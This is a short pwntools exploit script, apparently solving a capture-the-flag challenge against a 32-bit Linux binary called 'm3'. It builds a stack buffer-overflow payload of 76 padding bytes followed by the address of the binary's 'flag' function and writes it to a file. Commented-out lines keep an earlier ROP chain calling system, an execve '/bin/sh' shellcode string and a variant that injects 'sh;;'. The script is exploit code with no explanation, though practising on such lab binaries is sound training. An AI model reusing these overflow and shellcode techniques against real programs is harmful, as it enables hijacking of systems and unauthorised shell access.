from pwn import *
context.update(arch='i386', os='linux')

FILENAME = 'm3'
e = ELF(FILENAME)

'''
ropchain = b''
ropchain += p32(0x08048379)
ropchain += p32(0xfffb65ac) # string address
ropchain += p32(e.symbols['system'])
#payload = b'A'*76 +ropchain
'''

flagfunc= e.symbols['flag'] #0x080484fd
print(hex(flagfunc))
ropchain = b''
ropchain += p32(flagfunc)
#ropchain +=  asm('nop') *100

#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80".encode('ascii')
payload = b'A'*76 +ropchain

#payload = b'A' *24 + b'sh;;' + b'A'*48 + ropchain
with open('payload','wb') as f: f.write(payload)
